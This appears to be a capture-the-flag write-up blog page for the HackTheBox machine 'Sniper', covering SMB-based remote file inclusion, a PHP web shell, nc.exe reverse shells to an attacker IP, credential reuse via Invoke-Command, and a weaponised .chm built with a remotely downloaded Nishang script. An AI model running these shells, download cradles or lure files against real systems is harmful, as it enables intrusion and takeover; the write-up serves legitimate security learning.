<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Sniper | PwndSide</title><meta name=keywords content="windows,web,privesc,smb"><meta name=description content="Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/sniper-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/sniper-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Sniper"><meta property="og:description" content="Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-17T17:25:24+02:00"><meta property="article:modified_time" content="2023-07-17T17:25:24+02:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Web"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Smb"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Sniper"><meta name=twitter:description content="Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Sniper","item":"https://pwndside.github.io/posts/sniper-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Sniper","name":"Sniper","description":"Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges.","keywords":["windows","web","privesc","smb"],"articleBody":"Room Information Room name: Sniper Difficulty level: Medium Room link: https://app.hackthebox.com/machines/Sniper Tools Used Nmap Gobuster Port Scanning I start with a port scan:\nsudo nmap $IP -p- -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Sniper Co. |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 18459/tcp): CLEAN (Timeout) | Check 2 (port 45542/tcp): CLEAN (Timeout) | Check 3 (port 51336/udp): CLEAN (Timeout) | Check 4 (port 21300/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: 7h00m00s | smb2-time: | date: 2023-07-14T16:07:46 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required The results shows five open ports, the three relevant ports are the port 80 with website and a smb server running in the port 139/445.\nEnumeration Let’s enumerate the website\nIf we visit the website we found a delivery website called Sniper Co. The home page has three links which don’t lead anywhere, the “Our service” link redirects you to /blog/index.php and the “User Portal” link points to /user/index.php\nIf we check Wappalyzer we observe that the website is working with php.\nGobuster doesn’t shows anything interesting when we fuzz the website\n=============================================================== 2023/07/14 11:19:30 Starting gobuster in directory enumeration mode =============================================================== /blog/ (Status: 200) [Size: 5704] /Blog/ (Status: 200) [Size: 5704] /css/ (Status: 403) [Size: 1233] /images/ (Status: 403) [Size: 1233] /Images/ (Status: 403) [Size: 1233] /index.php/ (Status: 200) [Size: 2635] /Index.php/ (Status: 200) [Size: 2635] /index.php/ (Status: 200) [Size: 2635] /js/ (Status: 403) [Size: 1233] /user/ (Status: 302) [Size: 0] [--\u003e login.php] =============================================================== 2023/07/14 11:29:16 Finished =============================================================== Navigating the website we found a possible LFI at the blog page.\nIf we change the language, the page include a query to a file. There is a possibility that the website has the three language pages in the same directory.\ninclude $_GET['lang']; With that code line PHP include it.\nThe user site its a login page and like always I tried the common passwords but nothing works.\nIf we click to the Sign Up button we go to /user/registration.php\nIf we create a new user and try to log in the page shows a under construction page.\nExploiting Let’s return to the LFI vuln if we try to change the current directory to ..\\index.php, the page shows an error.\nBut if we try with aboslute paths like \\windows\\win.ini the page loads his content in the source code.\nIf we have LFI it’s possible that we have RFI at the same time.\nIf we run a website and try to connect to any file on it with the machine doesn’t do nothing. HTTP includes seem to be turned off.\nWe know that the machine is windows this is why we have other possible RFI in the smb service so let’s put a smbserver.py and try to load the same file.\nI used this command to run the server\nsmbserver.py smbFolder $(pwd) -smb2support This command creates a share folder named smbFolder when we put the current directory with $(pwd) and supports smb v2.\nNow the website doesn’t show the error and we obtained the output of the whoami command. We have managed to load a file with smb.\nI tried to load a web shell because the website is running php and we don’t know if the remote machine has nc, so a reverse shell maybe doesn’t work well.\nThe webshell works putting the value of the command in the url and the output of the command is wrote in the source code. The webshell PHP code is:\n\u003c?php echo system($_GET[\"cmd\"]); ?\u003e Now we have command injection, we can try to put in the smb share folder a nc.exe windows binary to run a reverse shell. I found this binary in the SecLists Folder \u003e Web-Shells \u003e FuzzDB.\nOnce we putted the file in the smbFolder we can run the reverse shell with the following url\nhttp://10.10.10.151/blog/?lang=\\\\\\\\10.10.14.20\\\\smbFolder\\\\basicWebShell.php\u0026cmd=\\\\\\\\10.10.14.20\\\\smbFolder\\\\nc.exe+-e+cmd+10.10.14.20+4444 As it a reverse shell we need to perform a netcat listener.\nnc -lv 4444 Gaining an Initial Foothold We are logged as iusr\niusr doesn’t seem to be like a common user so I supposed that is a daemon running the website.\nWe can’t acces to the chris directory so let’s see if there is any way to own the user.\nIf we return to the website folder there is a db.php file with credentials at the user folder of the website. We can use the password to perform a user pivoting to gain access to chris.\n\u003c?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(\"localhost\",\"dbuser\",\"36mEAhz/B8xQ~2VM\",\"sniper\"); // Check connection if (mysqli_connect_errno()) { echo \"Failed to connect to MySQL: \" . mysqli_connect_error(); } ?\u003e Let’s move to powershell to perform that technique.\nFirst let’s see what is the hostname\nWith the following commands we can make an object with the password and the username\n$user = \"Sniper\\chris\" $pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential($user, $pass) Now let’s invoke a command to see if the password is Chris’s. I used:\nInvoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { whoami } Now we can perform a reverse shell with the same command as above.\nInvoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { \\\\10.10.14.20\\smbFolder\\nc.exe -e cmd 10.10.14.20 4445 } nc -lv 4445 We obtained access, let’s cat the user’s flag\nEscalating Privilege Navigating through the directories we find a directory called c:\\Docs\nInside we have a note.txt written by the CEO of Sniper Co.\nnote.txt\nHi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you’ve prepared the documentation for our new app. Drop it here when you’re done with it.\nRegards, Sniper CEO.\nThe CEO wants a app documentation and is waiting to chris to drop it inside the Docs directory.\nIf we return to chris folder there is a interesting file at downloads directory.\nIt’s a .chm file which is Windows help files, so that could be the documentation that the CEO was talking about.\nWe know now that the CEO is waiting .chm file so let’s put a weaponized one in the docs directory.\nI have used a Windows VM for this part as it’s necessary for the use of HTML Help Workshop which is a Windows program which help us to create .chm files.\nFirst we need to install Out-CHM a NisHang tool which makes weaponized .chm with the help of HTML Help Workshop.\nOnce in the powershell we can import the script with:\nIEX(New-Object Net.WebClient).downloadString(\"https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1\") The use of Out-CHM is very simple we need to pass the Payload which are going to execute in the remote machine and the path of the HTML Help Workshop (If you don’t have it you can install it from here).\nWe are going to use the following payload to establish a reverse shell with the victim\nOut-CHM -Payload \"\\Docs\\nc.exe -e cmd 10.10.14.20 4443\" -HHCPath \"C:\\Program Files (x86)\\HTML Help Workshop\" Now we have a weaponoized .chm named doc.chm in our VM, only lefts to put it in the Docs directory of the remote machine. I moved first the file to my smb share and performed the next command:\ncopy \\\\10.10.14.20\\smbFolder\\doc.chm C:\\Docs We need to copy the nc.exe binary from or samba share to the remote machine to make sure it works.\ncopy \\\\10.10.14.20\\smbFolder\\nc.exe C:\\Docs Only rest put a listener and wait to the CEO to open my malicious file.\nnc -lv 4443 We have owned the system, let’s cat the root’s flag.\nLessons Learned What insights did you gain from the room?\nI learned how I can perform a smb RFI attack to gain RCE in a windows machine and to create weaponized .chm to perform a privesc.\nWere there any novel tools or techniques employed?\nI discovered a new technique called user pivoting which helps you to invoke commands with the user credentials.\nThank you for reading, and happy hacking! 😄\n","wordCount":"1413","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-07-17T17:25:24+02:00","dateModified":"2023-07-17T17:25:24+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/sniper-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Sniper</h1><div class=post-description>Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges.</div><div class=post-meta><span title='2023-07-17 17:25:24 +0200 CEST'>July 17, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1413 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/sniper-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li><li><a href=#lessons-learned>Lessons Learned</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Sniper</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/Sniper>https://app.hackthebox.com/machines/Sniper</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/sniper-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap</li><li>Gobuster</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><p>I start with a port scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -p- -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT      STATE SERVICE       REASON          VERSION
</span></span><span class=line><span class=cl>80/tcp    open  http          syn-ack ttl <span class=m>127</span> Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Sniper Co.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   syn-ack ttl <span class=m>127</span> Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker:
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 18459/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 45542/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 51336/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 21300/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 7h00m00s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-07-14T16:07:46
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1:
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span></code></pre></div><p>The results shows five open ports, the three relevant ports are the port 80 with website and a smb server running in the port 139/445.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>Let’s enumerate the website</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-1.png></p><p>If we visit the website we found a delivery website called Sniper Co. The home page has three links which don’t lead anywhere, the “Our service” link redirects you to <code>/blog/index.php</code> and the “User Portal” link points to <code>/user/index.php</code></p><p>If we check <strong>Wappalyzer</strong> we observe that the website is working with php.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-2.png></p><p><strong>Gobuster</strong> doesn’t shows anything interesting when we fuzz the website</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/14 11:19:30 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/blog/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5704<span class=o>]</span>
</span></span><span class=line><span class=cl>/Blog/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5704<span class=o>]</span>
</span></span><span class=line><span class=cl>/css/                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 1233<span class=o>]</span>
</span></span><span class=line><span class=cl>/images/              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 1233<span class=o>]</span>
</span></span><span class=line><span class=cl>/Images/              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 1233<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php/           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2635<span class=o>]</span>
</span></span><span class=line><span class=cl>/Index.php/           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2635<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php/           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2635<span class=o>]</span>
</span></span><span class=line><span class=cl>/js/                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 1233<span class=o>]</span>
</span></span><span class=line><span class=cl>/user/                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/14 11:29:16 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>Navigating the website we found a possible <strong>LFI</strong> at the blog page.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-3.png></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-4.png></p><p>If we change the language, the page include a query to a file. There is a possibility that the website has the three language pages in the same directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;lang&#39;</span><span class=p>];</span>
</span></span></code></pre></div><p>With that code line PHP include it.</p><p>The user site its a login page and like always I tried the common passwords but nothing works.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-5.png></p><p>If we click to the Sign Up button we go to <code>/user/registration.php</code></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-6.png></p><p>If we create a new user and try to log in the page shows a under construction page.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-7.png></p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>Let’s return to the <strong>LFI</strong> vuln if we try to change the current directory to <code>..\index.php</code>, the page shows an error.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-8.png></p><p>But if we try with aboslute paths like <code>\windows\win.ini</code> the page loads his content in the source code.</p><p>If we have LFI it’s possible that we have RFI at the same time.</p><p>If we run a website and try to connect to any file on it with the machine doesn’t do nothing. HTTP includes seem to be turned off.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-9.png></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-10.png></p><p>We know that the machine is windows this is why we have other possible <strong>RFI</strong> in the smb service so let’s put a <strong>smbserver.py</strong> and try to load the same file.</p><p>I used this command to run the server</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>smbserver</span><span class=o>.</span><span class=nx>py</span> <span class=nx>smbFolder</span> <span class=err>$</span><span class=p>(</span><span class=nx>pwd</span><span class=p>)</span> <span class=o>-</span><span class=nx>smb2support</span>
</span></span></code></pre></div><p>This command creates a share folder named smbFolder when we put the current directory with <code>$(pwd)</code> and supports smb v2.</p><p>Now the website doesn’t show the error and we obtained the output of the whoami command. We have managed to load a file with smb.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-11.png></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-12.png></p><p>I tried to load a web shell because the website is running php and we don’t know if the remote machine has nc, so a reverse shell maybe doesn’t work well.</p><p>The webshell works putting the value of the command in the url and the output of the command is wrote in the source code. The webshell PHP code is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Now we have command injection, we can try to put in the smb share folder a nc.exe windows binary to run a reverse shell. I found this binary in the <a href=https://github.com/danielmiessler/SecLists>SecLists</a> Folder > Web-Shells > FuzzDB.</p><p>Once we putted the file in the smbFolder we can run the reverse shell with the following url</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>http://10.10.10.151/blog/?lang=\\\\10.10.14.20\\smbFolder\\basicWebShell.php<span class=err>&amp;</span>cmd=\\\\10.10.14.20\\smbFolder\\nc.exe+-e+cmd+10.10.14.20+4444
</span></span></code></pre></div><p>As it a reverse shell we need to perform a netcat listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>nc -lv 4444
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/sniper-13.png></p><p>We are logged as <strong>iusr</strong></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-14.png></p><p><strong>iusr</strong> doesn’t seem to be like a common user so I supposed that is a daemon running the website.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-15.png></p><p>We can’t acces to the chris directory so let’s see if there is any way to own the user.</p><p>If we return to the website folder there is a db.php file with credentials at the user folder of the website. We can use the password to perform a user pivoting to gain access to <strong>chris</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// Enter your Host, username, password, database below.
</span></span></span><span class=line><span class=cl><span class=c1>// I left password empty because i do not set password on localhost.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$con</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s2>&#34;localhost&#34;</span><span class=p>,</span><span class=s2>&#34;dbuser&#34;</span><span class=p>,</span><span class=s2>&#34;36mEAhz/B8xQ~2VM&#34;</span><span class=p>,</span><span class=s2>&#34;sniper&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Check connection
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>mysqli_connect_errno</span><span class=p>())</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=s2>&#34;Failed to connect to MySQL: &#34;</span> <span class=o>.</span> <span class=nx>mysqli_connect_error</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Let’s move to powershell to perform that technique.</p><p>First let’s see what is the hostname</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-16.png></p><p>With the following commands we can make an object with the password and the username</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$user</span> <span class=p>=</span> <span class=s2>&#34;Sniper\chris&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$pass</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s1>&#39;36mEAhz/B8xQ~2VM&#39;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span>
</span></span><span class=line><span class=cl><span class=nv>$cred</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PSCredential</span><span class=p>(</span><span class=nv>$user</span><span class=p>,</span> <span class=nv>$pass</span><span class=p>)</span>
</span></span></code></pre></div><p>Now let’s invoke a command to see if the password is Chris&rsquo;s. I used:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-Credential</span> <span class=nv>$cred</span> <span class=n>-ComputerName</span> <span class=n>Sniper</span> <span class=n>-ScriptBlock</span> <span class=p>{</span> <span class=n>whoami</span> <span class=p>}</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/sniper-17.png></p><p>Now we can perform a reverse shell with the same command as above.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-Credential</span> <span class=nv>$cred</span> <span class=n>-ComputerName</span> <span class=n>Sniper</span> <span class=n>-ScriptBlock</span> <span class=p>{</span> <span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>-e</span> <span class=n>cmd</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=py>20</span> <span class=mf>4445</span> <span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>nc</span> <span class=n>-lv</span> <span class=mf>4445</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/sniper-18.png></p><p>We obtained access, let’s cat the <strong>user’s flag</strong></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-19.png></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>Navigating through the directories we find a directory called c:\Docs</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-20.png></p><p>Inside we have a note.txt written by the CEO of Sniper Co.</p><blockquote><p><strong>note.txt</strong></p><p>Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&rsquo;ve prepared the documentation for our new app. Drop it here when you&rsquo;re done with it.</p><p>Regards,
